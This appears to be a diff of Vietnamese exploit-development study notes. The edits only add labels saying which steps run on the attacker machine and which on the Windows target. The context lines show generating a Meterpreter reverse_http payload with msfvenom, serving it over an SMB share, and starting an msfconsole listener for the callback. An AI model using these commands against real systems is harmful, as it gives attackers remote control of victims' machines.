@@ -6,7 +6,7 @@ Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thá
 Để load API thì tính hash: \
 [Code tính hash tên các API](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/getAPIhash.py)
 
-Để sinh payload bằng metasploit:
+Để sinh payload bằng metasploit trên máy tấn công:
 ```
 $ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
 ```
@@ -20,12 +20,12 @@ Dùng notepad để thêm 1 dòng trong file hosts.
   <Địa chỉ IP>    kali
 ```
 
-Để tạo SMB server ([Nếu không có lệnh smbserver.py]())
+Để tạo SMB server trên máy tấn công ([Nếu không có lệnh smbserver.py]())
 ```
 sudo smbserver.py met /home/kali/ -smb2support
 ```
 
-Khi đã chạy smb server thành công thì có thể kiểm tra bằng lệnh sau:
+Khi đã chạy smb server thành công thì có thể kiểm tra bằng lệnh sau trên máy Windows:
 ```
 pushd <Đường dẫn UNC>
 # VD: pushd \\ubuntu\folder
@@ -35,7 +35,7 @@ pushd <Đường dẫn UNC>
 popd <Đường dẫn UNC>
 ```
 
-Để tạo listener trên máy kali khi thực thi shellcode:
+Để tạo listener trên máy tấn công khi thực thi shellcode:
 ```
 # Exploit after met.exe execution
 $ msfconsole
